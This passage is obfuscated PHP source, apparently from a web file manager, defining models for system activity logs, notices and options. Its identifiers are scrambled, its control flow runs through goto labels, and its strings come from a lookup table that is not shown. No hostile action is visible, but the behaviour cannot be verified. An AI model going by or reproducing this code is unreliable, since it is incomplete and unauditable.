<?php
 goto F¬ÔÜÚöÜÚ; Aî§­ÂêŠÈ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\x69\155\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\x75\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $b¯¼…”Òî =& $_SERVER[Î¿—”òá]; return array($b¯¼…”Òî[2375] => LNG($b¯¼…”Òî[2376]), $b¯¼…”Òî[2377] => LNG($b¯¼…”Òî[2378]), $b¯¼…”Òî[2036] => LNG($b¯¼…”Òî[2379]), $b¯¼…”Òî[2380] => LNG($b¯¼…”Òî[2381]), $b¯¼…”Òî[2382] => LNG($b¯¼…”Òî[2383]), $b¯¼…”Òî[2384] => LNG($b¯¼…”Òî[2385]), $b¯¼…”Òî[2386] => LNG($b¯¼…”Òî[2387]), $b¯¼…”Òî[2388] => LNG($b¯¼…”Òî[2389]), $b¯¼…”Òî[2067] => LNG($b¯¼…”Òî[2390]), $b¯¼…”Òî[2068] => LNG($b¯¼…”Òî[2391]), $b¯¼…”Òî[2392] => LNG($b¯¼…”Òî[2393]), $b¯¼…”Òî[2394] => LNG($b¯¼…”Òî[2395]), $b¯¼…”Òî[2396] => LNG($b¯¼…”Òî[2397]), $b¯¼…”Òî[2398] => LNG($b¯¼…”Òî[2399]), $b¯¼…”Òî[2065] => LNG($b¯¼…”Òî[2400]), $b¯¼…”Òî[2072] => LNG($b¯¼…”Òî[2401]), $b¯¼…”Òî[2402] => LNG($b¯¼…”Òî[2403]), $b¯¼…”Òî[2404] => LNG($b¯¼…”Òî[2405]), $b¯¼…”Òî[2406] => LNG($b¯¼…”Òî[2407]), $b¯¼…”Òî[2408] => LNG($b¯¼…”Òî[2409]), $b¯¼…”Òî[2075] => LNG($b¯¼…”Òî[2410]), $b¯¼…”Òî[2076] => LNG($b¯¼…”Òî[2411]), $b¯¼…”Òî[2412] => LNG($b¯¼…”Òî[2413]), $b¯¼…”Òî[2414] => LNG($b¯¼…”Òî[2415]), $b¯¼…”Òî[2416] => LNG($b¯¼…”Òî[2417]), $b¯¼…”Òî[2070] => LNG($b¯¼…”Òî[2418]), $b¯¼…”Òî[2419] => LNG($b¯¼…”Òî[2420]), $b¯¼…”Òî[2069] => LNG($b¯¼…”Òî[2421]), $b¯¼…”Òî[2422] => LNG($b¯¼…”Òî[2423]), $b¯¼…”Òî[2424] => LNG($b¯¼…”Òî[2425]), $b¯¼…”Òî[2426] => LNG($b¯¼…”Òî[2426]), $b¯¼…”Òî[2427] => LNG($b¯¼…”Òî[2040]), $b¯¼…”Òî[2428] => LNG($b¯¼…”Òî[2429]), $b¯¼…”Òî[2430] => LNG($b¯¼…”Òî[2431]), $b¯¼…”Òî[2432] => LNG($b¯¼…”Òî[2433]), $b¯¼…”Òî[2434] => LNG($b¯¼…”Òî[2435]), $b¯¼…”Òî[2436] => LNG($b¯¼…”Òî[2437]), $b¯¼…”Òî[2438] => LNG($b¯¼…”Òî[2438]), $b¯¼…”Òî[2439] => LNG($b¯¼…”Òî[2440]), $b¯¼…”Òî[2441] => LNG($b¯¼…”Òî[2442]), $b¯¼…”Òî[2443] => LNG($b¯¼…”Òî[2444]), $b¯¼…”Òî[2445] => LNG($b¯¼…”Òî[2446]), $b¯¼…”Òî[2447] => LNG($b¯¼…”Òî[2448]), $b¯¼…”Òî[2449] => LNG($b¯¼…”Òî[2450])); } private function typeFile() { $b«°Ã ³„ =& $_SERVER[Î¿—”òá]; $A˜–ÃÊ˜ß… = array($b«°Ã ³„[2072] => array($b«°Ã ³„[2073]), $b«°Ã ³„[2396] => array($b«°Ã ³„[2451]), $b«°Ã ³„[2398] => array($b«°Ã ³„[2452]), $b«°Ã ³„[2065] => array($b«°Ã ³„[2066]), $b«°Ã ³„[2404] => array(), $b«°Ã ³„[2406] => array(), $b«°Ã ³„[2408] => array(), $b«°Ã ³„[2075] => array($b«°Ã ³„[2077]), $b«°Ã ³„[2076] => array($b«°Ã ³„[2077]), $b«°Ã ³„[2412] => array($b«°Ã ³„[2453]), $b«°Ã ³„[2414] => array($b«°Ã ³„[2453]), $b«°Ã ³„[2416] => array($b«°Ã ³„[2454]), $b«°Ã ³„[2402] => array($b«°Ã ³„[2455]), $b«°Ã ³„[2070] => array($b«°Ã ³„[2456]), $b«°Ã ³„[2419] => array($b«°Ã ³„[2457]), $b«°Ã ³„[2069] => array($b«°Ã ³„[2071])); return $A˜–ÃÊ˜ß…; } private function typeAll() { goto a×´Ö™×; a×´Ö™×: $eÃÉñ²ãŸ =& $_SERVER[Î¿—”òá]; $AØ˜³Ì“õÇ = $this->typeList; $FåŒ‡•ñ = array_filter($this->typeFile()); goto bØ²ÙŞƒí¤; bØ²ÙŞƒí¤: foreach ($FåŒ‡•ñ as $bõŞîƒÀ« => $açµˆ°¢Œ) { $AØ˜³Ì“õÇ[$açµˆ°¢Œ[0]] = $AØ˜³Ì“õÇ[$bõŞîƒÀ«]; } $AØ˜³Ì“õÇ[$eÃÉñ²ãŸ[2077]] = LNG($eÃÉñ²ãŸ[2458]); $AØ˜³Ì“õÇ[$eÃÉñ²ãŸ[2453]] = LNG($eÃÉñ²ãŸ[2459]); goto B„°²˜ŞÏö; B„°²˜ŞÏö: return $AØ˜³Ì“õÇ; goto C¤çŠ¤½; C¤çŠ¤½: } public function addLog($C‹©Æğ‚, $F÷ŒàÊÖÂâ = array()) { goto d÷Ş“½‰¬÷; bäÃŠ®Å¤: $E¶ˆÅÅ¦¼ã = get_client_ip(); if (!$F÷ŒàÊÖÂâ || strlen(json_encode($F÷ŒàÊÖÂâ)) >= 1024) { $F÷ŒàÊÖÂâ = array($cÁêæì—‚Û[2460] => $E¶ˆÅÅ¦¼ã); } else { if (is_array($F÷ŒàÊÖÂâ)) { $F÷ŒàÊÖÂâ[$cÁêæì—‚Û[2460]] = $E¶ˆÅÅ¦¼ã; } else { $F÷ŒàÊÖÂâ = array($cÁêæì—‚Û[1027] => $F÷ŒàÊÖÂâ, $cÁêæì—‚Û[2460] => $E¶ˆÅÅ¦¼ã); } } $F÷ŒàÊÖÂâ = array($cÁêæì—‚Û[1419] => Session::sign(), $cÁêæì—‚Û[1420] => $F˜ÇÊ‚óó, $cÁêæì—‚Û[29] => $C‹©Æğ‚, $cÁêæì—‚Û[1422] => json_encode($F÷ŒàÊÖÂâ)); goto d‹õ°¬Ùˆ±; d‹õ°¬Ùˆ±: parent::add($F÷ŒàÊÖÂâ); goto fô³»ïòäÂ; d÷Ş“½‰¬÷: $cÁêæì—‚Û =& $_SERVER[Î¿—”òá]; if (!isset($this->typeList[$C‹©Æğ‚])) { return; } $F˜ÇÊ‚óó = USER_ID ? USER_ID : (isset($F÷ŒàÊÖÂâ[$cÁêæì—‚Û[1429]]) ? $F÷ŒàÊÖÂâ[$cÁêæì—‚Û[1429]] : 0); goto bäÃŠ®Å¤; fô³»ïòäÂ: } public function remove($B¿…á•ö‰) { $this->where(array($_SERVER[Î¿—”òá][385] => $B¿…á•ö‰))->delete(); } private function _makeOrder($c·¯ÔçÙø = '') { goto b¯¦ƒƒÂí©; Bè¬éÌ‚æ…: return $this->order($c·¯ÔçÙø); goto fñÏ¿Ï«‚‘; b¯¦ƒƒÂí©: $EäÅßƒƒ‹© =& $_SERVER[Î¿—”òá]; $e«•ß²ƒÌ = $EäÅßƒƒ‹©[187]; $AÍíèÊÉ—å = array($EäÅßƒƒ‹©[402] => $EäÅßƒƒ‹©[403], $EäÅßƒƒ‹©[404] => $EäÅßƒƒ‹©[405]); goto b»è»İ¾; b»è»İ¾: $Bà…Í¯óŞš = Input::get($EäÅßƒƒ‹©[408], $EäÅßƒƒ‹©[7], $EäÅßƒƒ‹©[2238], array($EäÅßƒƒ‹©[2174], $EäÅßƒƒ‹©[404])); $Bà…Í¯óŞš = $AÍíèÊÉ—å[$Bà…Í¯óŞš]; $c·¯ÔçÙø = $c·¯ÔçÙø . "{$e«•ß²ƒÌ}\40{$Bà…Í¯óŞš}"; goto Bè¬éÌ‚æ…; fñÏ¿Ï«‚‘: } public function get($BÄ¢˜àæ¤ = '') { goto eÓİŸß‚¥Ş; cà³ÇÖÛ¤ñ: $Cˆ‹¶´Ø†ë[$DÍëÊÅ²§[354]] = $this->logList($Cˆ‹¶´Ø†ë[$DÍëÊÅ²§[354]]); return $Cˆ‹¶´Ø†ë; goto déî¨ìÇ–ª; eÓİŸß‚¥Ş: $DÍëÊÅ²§ =& $_SERVER[Î¿—”òá]; if (!$BÄ¢˜àæ¤) { show_json(array()); } $b³¼Êè’†Ë = array(); goto aƒÓÓ£Ñ; e¬ñšª©óË: if (!empty($BÄ¢˜àæ¤[$DÍëÊÅ²§[2460]])) { $b³¼Êè’†Ë[$DÍëÊÅ²§[405]] = array($DÍëÊÅ²§[748], "\45{$BÄ¢˜àæ¤[$DÍëÊÅ²§[2460]]}\x25"); } $Cˆ‹¶´Ø†ë = $this->_makeOrder()->where($b³¼Êè’†Ë)->selectPage(); if (empty($Cˆ‹¶´Ø†ë[$DÍëÊÅ²§[354]])) { show_json(array(), !0, $Cˆ‹¶´Ø†ë[$DÍëÊÅ²§[351]]); } goto cà³ÇÖÛ¤ñ; aƒÓÓ£Ñ: if ($BÄ¢˜àæ¤[$DÍëÊÅ²§[1429]]) { $b³¼Êè’†Ë[$DÍëÊÅ²§[1429]] = $BÄ¢˜àæ¤[$DÍëÊÅ²§[1429]]; } if (isset($BÄ¢˜àæ¤[$DÍëÊÅ²§[698]])) { $EëÌÄ—öÓ = $BÄ¢˜àæ¤[$DÍëÊÅ²§[698]]; $e÷êßö‰ = isset($BÄ¢˜àæ¤[$DÍëÊÅ²§[699]]) ? $BÄ¢˜àæ¤[$DÍëÊÅ²§[699]] : time(); $b³¼Êè’†Ë[$DÍëÊÅ²§[187]] = array($DÍëÊÅ²§[321], array($EëÌÄ—öÓ, $e÷êßö‰)); } if ($BÄ¢˜àæ¤[$DÍëÊÅ²§[29]]) { $AµèªÆŒ˜â = explode($DÍëÊÅ²§[47], $BÄ¢˜àæ¤[$DÍëÊÅ²§[29]]); $F‹êÊŒÎ‹É = $this->typeFile(); $B£­™À¤– = array(); foreach ($AµèªÆŒ˜â as $Aº¨ÄÎÛãœ) { $B£­™À¤–[] = $Aº¨ÄÎÛãœ; if (isset($F‹êÊŒÎ‹É[$Aº¨ÄÎÛãœ])) { $B£­™À¤– = array_merge($B£­™À¤–, $F‹êÊŒÎ‹É[$Aº¨ÄÎÛãœ]); } } $B£­™À¤– = array_unique($B£­™À¤–); if ($B£­™À¤–) { $b³¼Êè’†Ë[$DÍëÊÅ²§[29]] = array($DÍëÊÅ²§[7], $B£­™À¤–); } } goto e¬ñšª©óË; déî¨ìÇ–ª: } private function ipAddress(&$dÛˆ®…˜ò¨) { $BÁÈ•Ï¨À =& $_SERVER[Î¿—”òá]; if (!empty($dÛˆ®…˜ò¨[$BÁÈ•Ï¨À[2460]])) { $e¿¹—²Ú¦¶ = IpLocation::get($dÛˆ®…˜ò¨[$BÁÈ•Ï¨À[2460]]); } else { $e¿¹—²Ú¦¶ = LNG($BÁÈ•Ï¨À[2461]); } $dÛˆ®…˜ò¨[$BÁÈ•Ï¨À[2462]] = $e¿¹—²Ú¦¶; } private function descZipDownload($b°Íñè†Û, &$CÀÙæ‹ÚÏ¿) { $b¯µªœ‡ùÉ =& $_SERVER[Î¿—”òá]; if (!isset($b°Íñè†Û[$b¯µªœ‡ùÉ[2463]])) { return; } $c˜ÛÚÕªÎŒ = json_decode($b°Íñè†Û[$b¯µªœ‡ùÉ[2463]], !0); foreach ($c˜ÛÚÕªÎŒ as $C¸İ—•øœÎ) { if (!IO::init($C¸İ—•øœÎ[$b¯µªœ‡ùÉ[75]])) { continue; } if (!($e²Ã©õøé = IO::infoFull($C¸İ—•øœÎ[$b¯µªœ‡ùÉ[75]]))) { continue; } $b°Íñè†Û[$b¯µªœ‡ùÉ[75]] = $C¸İ—•øœÎ[$b¯µªœ‡ùÉ[75]]; $CÀÙæ‹ÚÏ¿[] = $b°Íñè†Û[$b¯µªœ‡ùÉ[369]] = $e²Ã©õøé[$b¯µªœ‡ùÉ[369]]; $CÀÙæ‹ÚÏ¿[] = $b°Íñè†Û[$b¯µªœ‡ùÉ[2281]] = $e²Ã©õøé[$b¯µªœ‡ùÉ[461]]; break; } return $b°Íñè†Û; } private function getSourceList(&$b›Ù†Œ½¶Õ) { $DĞÜĞ¿…ò =& $_SERVER[Î¿—”òá]; $aæÃ£ššì÷ = array(); foreach ($b›Ù†Œ½¶Õ as $aŞ¥œÑŸî => $dö®Ş”§µ±) { goto aÁé‚á¾ŠÙ; aÁé‚á¾ŠÙ: $BÛ¢É÷ëŠ = json_decode($dö®Ş”§µ±[$DĞÜĞ¿…ò[405]], !0); if ($dö®Ş”§µ±[$DĞÜĞ¿…ò[29]] == $DĞÜĞ¿…ò[2068]) { $BÛ¢É÷ëŠ = $this->descZipDownload($BÛ¢É÷ëŠ, $aæÃ£ššì÷); $b›Ù†Œ½¶Õ[$aŞ¥œÑŸî][$DĞÜĞ¿…ò[405]] = json_encode($BÛ¢É÷ëŠ); continue; } if (strpos($dö®Ş”§µ±[$DĞÜĞ¿…ò[29]], $DĞÜĞ¿…ò[2282]) !== 0) { goto AœÈ¿™ö Î; eá±ß÷ª¹: continue; goto eÌî¿‡¨ÓÑ; DíŞ—î­ƒ: $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[369]] = $B«’­ø¹°æ[$DĞÜĞ¿…ò[369]]; $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[2281]] = $B«’­ø¹°æ[$DĞÜĞ¿…ò[461]]; $b›Ù†Œ½¶Õ[$aŞ¥œÑŸî][$DĞÜĞ¿…ò[405]] = json_encode($BÛ¢É÷ëŠ); goto eá±ß÷ª¹; AœÈ¿™ö Î: if (!isset($BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[75]]) || strpos($dö®Ş”§µ±[$DĞÜĞ¿…ò[29]], $DĞÜĞ¿…ò[2464]) !== 0) { continue; } if (!IO::init($BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[75]])) { continue; } if (!($B«’­ø¹°æ = IO::infoFull($BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[75]]))) { continue; } goto DíŞ—î­ƒ; eÌî¿‡¨ÓÑ: } goto dõÈ·Å÷Ê; dõÈ·Å÷Ê: $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[369]]; $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[2281]]; if ($BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[29]] == $DĞÜĞ¿…ò[492]) { $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[405]][$DĞÜĞ¿…ò[1000]]; $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[405]][$DĞÜĞ¿…ò[1001]]; } goto dë‹™È‡‰Î; dë‹™È‡‰Î: if ($BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[29]] == $DĞÜĞ¿…ò[2289]) { $aæÃ£ššì÷[] = $BÛ¢É÷ëŠ[$DĞÜĞ¿…ò[405]][$DĞÜĞ¿…ò[369]]; } goto a†¢ñ¬Æ›; a†¢ñ¬Æ›: } if (!$aæÃ£ššì÷) { return array(); } return Model($DĞÜĞ¿…ò[749])->sourceListInfo($aæÃ£ššì÷, !0); } private function logList($F§‡Å«ó) { goto B¢†Ÿ˜‡ÍÎ; B¢†Ÿ˜‡ÍÎ: $dÄîé•ç‡ =& $_SERVER[Î¿—”òá]; $a¥¾Ìã‰ß = array_to_keyvalue($F§‡Å«ó, $dÄîé•ç‡[33], $dÄîé•ç‡[1429]); $f…Öå©ßŞË = Model($dÄîé•ç‡[477])->userListInfo(array_unique($a¥¾Ìã‰ß)); goto FÒêƒÊå¸Î; a–ÕŒ†äÔï: $Bê¥Ÿ·íÍ¯ = array(); foreach ($F§‡Å«ó as $CŒŞŠê±œÂ => $d÷—ØºÖ) { goto a¥Í‡Õ‹çá; FÍÊİšËÎ“: $this->ipAddress($d÷—ØºÖ); if (strpos($AèÄº†‚ÏÓ, $dÄîé•ç‡[2282]) === 0 || isset($fÀ£æ³¿«[$dÄîé•ç‡[2281]])) { goto fÉ¼¬ã¡²ğ; dëŸ¹ñÁ³™: if ($fÀ£æ³¿«[$dÄîé•ç‡[2294]] && $fÀ£æ³¿«[$dÄîé•ç‡[2294]][$dÄîé•ç‡[371]] == $dÄîé•ç‡[1073]) { $Bê¥Ÿ·íÍ¯[] = $d÷—ØºÖ[$dÄîé•ç‡[367]]; unset($F§‡Å«ó[$CŒŞŠê±œÂ]); continue; } goto F¬‹Ç‡©‰; DŠ®¹ß®ô°: if ($fÀ£æ³¿«[$dÄîé•ç‡[29]] == $dÄîé•ç‡[2289]) { $fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[369]] = $FòÑÑŒÆïÆ[$fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[369]]]; } if ($fÀ£æ³¿«[$dÄîé•ç‡[29]] == $dÄîé•ç‡[2063]) { $fÀ£æ³¿«[$dÄîé•ç‡[2294]] = $fÀ£æ³¿«[$dÄîé•ç‡[391]]; $fÀ£æ³¿«[$dÄîé•ç‡[2281]] = $fÀ£æ³¿«[$dÄîé•ç‡[2294]][$dÄîé•ç‡[369]]; $fÀ£æ³¿«[$dÄîé•ç‡[391]] = !1; $fÀ£æ³¿«[$dÄîé•ç‡[369]] = $dÄîé•ç‡[33]; } if ($fÀ£æ³¿«[$dÄîé•ç‡[391]] && $fÀ£æ³¿«[$dÄîé•ç‡[391]][$dÄîé•ç‡[371]] == $dÄîé•ç‡[1073]) { $Bê¥Ÿ·íÍ¯[] = $d÷—ØºÖ[$dÄîé•ç‡[367]]; unset($F§‡Å«ó[$CŒŞŠê±œÂ]); continue; } goto dëŸ¹ñÁ³™; fÉ¼¬ã¡²ğ: $fÀ£æ³¿«[$dÄîé•ç‡[391]] = $FòÑÑŒÆïÆ[$fÀ£æ³¿«[$dÄîé•ç‡[369]]]; $fÀ£æ³¿«[$dÄîé•ç‡[2294]] = $FòÑÑŒÆïÆ[$fÀ£æ³¿«[$dÄîé•ç‡[2281]]]; if ($fÀ£æ³¿«[$dÄîé•ç‡[29]] == $dÄîé•ç‡[492]) { $fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[1000]] = $FòÑÑŒÆïÆ[$fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[1000]]]; $fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[1001]] = $FòÑÑŒÆïÆ[$fÀ£æ³¿«[$dÄîé•ç‡[405]][$dÄîé•ç‡[1001]]]; } goto DŠ®¹ß®ô°; F¬‹Ç‡©‰: } $d÷—ØºÖ[$dÄîé•ç‡[405]] = $fÀ£æ³¿«; goto DƒÀøÀ—¼Â; eëÇÜ¹¨Ù©: $d÷—ØºÖ[$dÄîé•ç‡[2237]] = $cô…‚Šñ®; $fÀ£æ³¿« = json_decode($d÷—ØºÖ[$dÄîé•ç‡[405]], !0); $d÷—ØºÖ[$dÄîé•ç‡[2460]] = isset($fÀ£æ³¿«[$dÄîé•ç‡[2460]]) ? $fÀ£æ³¿«[$dÄîé•ç‡[2460]] : $dÄîé•ç‡[33]; goto FÍÊİšËÎ“; F¶Üß¢‚ª: $d÷—ØºÖ[$dÄîé•ç‡[28]] = isset($cô…‚Šñ®[$dÄîé•ç‡[28]]) ? $cô…‚Šñ®[$dÄîé•ç‡[28]] : LNG($dÄîé•ç‡[2461]); $d÷—ØºÖ[$dÄîé•ç‡[2329]] = isset($cô…‚Šñ®[$dÄîé•ç‡[2329]]) ? $cô…‚Šñ®[$dÄîé•ç‡[2329]] : $dÄîé•ç‡[33]; $d÷—ØºÖ[$dÄîé•ç‡[1335]] = isset($dºÔ‘ˆ¨×[$AèÄº†‚ÏÓ]) ? $dºÔ‘ˆ¨×[$AèÄº†‚ÏÓ] : $dÀá•Û ®Æ; goto eëÇÜ¹¨Ù©; DƒÀøÀ—¼Â: unset($d÷—ØºÖ[$dÄîé•ç‡[2467]]); $cˆ¦ˆëˆâÔ[] = $d÷—ØºÖ; goto Cëá†Ö”¡; a¥Í‡Õ‹çá: $AèÄº†‚ÏÓ = $d÷—ØºÖ[$dÄîé•ç‡[29]]; $cô…‚Šñ® = isset($f…Öå©ßŞË[$d÷—ØºÖ[$dÄîé•ç‡[1429]]]) ? $f…Öå©ßŞË[$d÷—ØºÖ[$dÄîé•ç‡[1429]]] : !1; $dÀá•Û ®Æ = strpos($AèÄº†‚ÏÓ, $dÄîé•ç‡[2465]) === 0 ? LNG($dÄîé•ç‡[2466]) : LNG($dÄîé•ç‡[2461]); goto F¶Üß¢‚ª; Cëá†Ö”¡: } $this->clearSystemPathLog($Bê¥Ÿ·íÍ¯); goto D¼óÄ¶ÕÇ; FÒêƒÊå¸Î: $FòÑÑŒÆïÆ = $this->getSourceList($F§‡Å«ó); $dºÔ‘ˆ¨× = $this->typeAll(); $cˆ¦ˆëˆâÔ = array(); goto a–ÕŒ†äÔï; D¼óÄ¶ÕÇ: return $cˆ¦ˆëˆâÔ; goto F¹½à¼‡È; F¹½à¼‡È: } private function clearSystemPathLog($D×…ì…ä‰) { $D¢‰”°°æÄ =& $_SERVER[Î¿—”òá]; if (count($D×…ì…ä‰) == 0) { return; } $a»œÎª­Ä‹ = array($D¢‰”°°æÄ[367] => array($D¢‰”°°æÄ[7], array_unique($D×…ì…ä‰))); $this->where($a»œÎª­Ä‹)->delete(); } public function deviceList($E£Í„«İŞ, $a¢µÑ“¿”Ì = 0) { $eÅ¨í½£¿ =& $_SERVER[Î¿—”òá]; $bÈ×åóõ¦Ø = array($eÅ¨í½£¿[1429] => $E£Í„«İŞ, $eÅ¨í½£¿[187] => array($eÅ¨í½£¿[921], $a¢µÑ“¿”Ì), $eÅ¨í½£¿[29] => $eÅ¨í½£¿[2036]); $bËˆƒœÛ¾Ë = array(); $BèàÑ¨Î¨Ş = $this->field($eÅ¨í½£¿[2468])->where($bÈ×åóõ¦Ø)->order($eÅ¨í½£¿[2292])->limit(50)->select(); foreach ($BèàÑ¨Î¨Ş as $CóÊ†µÎ => $DÎÓ©ê¥Æ…) { goto cÉëêÊ«Æ; dù£š–øŒ¡: $this->ipAddress($DÎÓ©ê¥Æ…); $DÎÓ©ê¥Æ…[$eÅ¨í½£¿[405]] = $eÅ„Óô•³©; $bËˆƒœÛ¾Ë[$DÅ†ˆ÷¬×Ï] = $DÎÓ©ê¥Æ…; goto FàÊÍ•“»«; C¡ÏæõÉ‡Ö: unset($eÅ„Óô•³©[$eÅ¨í½£¿[2460]]); $DÅ†ˆ÷¬×Ï = $this->deviceType($eÅ„Óô•³©[$eÅ¨í½£¿[2283]]); if (isset($bËˆƒœÛ¾Ë[$DÅ†ˆ÷¬×Ï])) { continue; } goto dù£š–øŒ¡; cÉëêÊ«Æ: if ($CóÊ†µÎ > 0 && abs($DÎÓ©ê¥Æ…[$eÅ¨í½£¿[187]] - $BèàÑ¨Î¨Ş[$CóÊ†µÎ - 1][$eÅ¨í½£¿[187]]) < 5) { continue; } $eÅ„Óô•³© = json_decode($DÎÓ©ê¥Æ…[$eÅ¨í½£¿[405]], !0); $DÎÓ©ê¥Æ…[$eÅ¨í½£¿[2460]] = isset($eÅ„Óô•³©[$eÅ¨í½£¿[2460]]) ? $eÅ„Óô•³©[$eÅ¨í½£¿[2460]] : $eÅ¨í½£¿[33]; goto C¡ÏæõÉ‡Ö; FàÊÍ•“»«: } return array_values($bËˆƒœÛ¾Ë); } public function deviceType($f…ìŠº¾éë) { return $f…ìŠº¾éë; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\156\157\164\151\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\x6f\156\164\145\156\x74", "\x61\165\x74\150", "\x6d\x6f\x64\x65", "\164\151\x6d\x65", "\x74\x79\160\145", "\154\145\x76\145\x6c", "\145\x6e\141\142\154\145", "\163\157\x72\x74"); public function listData($EĞêÃ¡Ê³ = false, $eŞù¡’¸¹ù = "\x73\x6f\x72\164", $CáĞ‘ç‡ƒ = false) { return parent::listData($EĞêÃ¡Ê³, $eŞù¡’¸¹ù, $CáĞ‘ç‡ƒ); } public function add($a…‡¨Ÿ¥–Ç) { $bºä¸ñà³ =& $_SERVER[Î¿—”òá]; $C¶¬ ßÍ˜™ = time(); if ($a…‡¨Ÿ¥–Ç[$bºä¸ñà³[12]] == $bºä¸ñà³[2469]) { $C¶¬ ßÍ˜™ = strtotime($a…‡¨Ÿ¥–Ç[$bºä¸ñà³[190]]); } $a…‡¨Ÿ¥–Ç[$bºä¸ñà³[190]] = $C¶¬ ßÍ˜™; return parent::insert($a…‡¨Ÿ¥–Ç); } public function update($aÏŒÂ·•é‘, $AÏ•òÄ®“ñ) { goto EÎÏ“ÀÑçÆ; FÉ’è¼½õŒ: return parent::update($aÏŒÂ·•é‘, $AÏ•òÄ®“ñ); goto d‚Àß±Ùš©; D¬öÍµ…Á: $a¨¹ÂØò‹– = time(); if ($AÏ•òÄ®“ñ[$b÷éÑÓŠô[12]] == $b÷éÑÓŠô[2469]) { $a¨¹ÂØò‹– = strtotime($AÏ•òÄ®“ñ[$b÷éÑÓŠô[190]]); } $AÏ•òÄ®“ñ[$b÷éÑÓŠô[190]] = $a¨¹ÂØò‹–; goto FÉ’è¼½õŒ; EÎÏ“ÀÑçÆ: $b÷éÑÓŠô =& $_SERVER[Î¿—”òá]; $cË«¨ìåŠ = $this->listData($aÏŒÂ·•é‘); if (!$cË«¨ìåŠ) { return !1; } goto D¬öÍµ…Á; d‚Àß±Ùš©: } public function remove($aŞËšĞ…Ö) { $cËÙÜ¥î²ì = $this->listData($aŞËšĞ…Ö); if (!$cËÙÜ¥î²ì || $cËÙÜ¥î²ì[$_SERVER[Î¿—”òá][1073]]) { return !1; } return parent::remove($aŞËšĞ…Ö); } public function sort($AÕ•’ÇÙª, $dº¬ªµ«Ó) { return parent::update($AÕ•’ÇÙª, $dº¬ªµ«Ó); } public function enable($F‹¯’ŸÅøÔ, $f¢Ç‰İáĞ) { return parent::update($F‹¯’ŸÅøÔ, array($_SERVER[Î¿—”òá][2470] => $f¢Ç‰İáĞ)); } private function initUserOption() { $c‘‹îù¶º‹ =& $_SERVER[Î¿—”òá]; $this->optionType = $c‘‹îù¶º‹[2471]; $this->modelType = $c‘‹îù¶º‹[2472]; $this->field = array($c‘‹îù¶º‹[2473], $c‘‹îù¶º‹[28], $c‘‹îù¶º‹[190], $c‘‹îù¶º‹[29], $c‘‹îù¶º‹[2474], $c‘‹îù¶º‹[685], $c‘‹îù¶º‹[183]); } public function userNoticeGet($c¥áŠß·¯ = false) { $this->initUserOption(); return parent::listData($c¥áŠß·¯, $_SERVER[Î¿—”òá][367], !0); } public function userNoticeAdd($DäöºŞí÷¤) { $DŠíƒ–Íò =& $_SERVER[Î¿—”òá]; $this->initUserOption(); $e‡ÕÑÅ…Ï = $this->findByKey($DŠíƒ–Íò[2473], $DäöºŞí÷¤[$DŠíƒ–Íò[367]]); if ($e‡ÕÑÅ…Ï) { return !0; } $fİáĞÑäñ¹ = array($DŠíƒ–Íò[2473] => $DäöºŞí÷¤[$DŠíƒ–Íò[367]], $DŠíƒ–Íò[28] => $DäöºŞí÷¤[$DŠíƒ–Íò[28]], $DŠíƒ–Íò[190] => $DäöºŞí÷¤[$DŠíƒ–Íò[190]], $DŠíƒ–Íò[29] => isset($DäöºŞí÷¤[$DŠíƒ–Íò[29]]) ? $DäöºŞí÷¤[$DŠíƒ–Íò[29]] : 1, $DŠíƒ–Íò[2474] => isset($DäöºŞí÷¤[$DŠíƒ–Íò[2474]]) ? $DäöºŞí÷¤[$DŠíƒ–Íò[2474]] : 0, $DŠíƒ–Íò[685] => 0, $DŠíƒ–Íò[183] => 0); return parent::insert($fİáĞÑäñ¹); } public function userNoticeEdit($A†ê‘’òŠÆ, $fßí®¿à—Ë) { $this->initUserOption(); return parent::update($A†ê‘’òŠÆ, $fßí®¿à—Ë); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\145\x6e\165", "\x72\157\154\145", "\162\157\154\x65\107\162\x6f\x75\x70", "\x72\145\147\151\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($eÛµò÷Ôó†) { return "\x53\x79\x73\x74\x65\x6d\x4f\x70\x74\151\157\156\x5f{$eÛµò÷Ôó†}"; } protected function optionDefault($f·¹¹Ïï… = '') { $B‚ ¸µ‚¤ =& $_SERVER[Î¿—”òá]; if ($f·¹¹Ïï… == $B‚ ¸µ‚¤[33]) { return $GLOBALS[$B‚ ¸µ‚¤[6]][$B‚ ¸µ‚¤[2475]]; } } } goto Fö¡Ó²†ë§; d§ßò·¸‡œ: if (class_exists($_SERVER[Î¿—”òá][1958])) { class Services_JSON_Error extends PEAR_Error { function __construct($B°Šë‚‘õ = "\165\156\153\x6e\157\x77\x6e\x20\145\x72\x72\x6f\162", $D©ø£—‰› = null, $aŠ§°×õÒ = null, $E¼†¥¹‰ã™ = null, $c‰Á÷õ­¨Ö = null) { 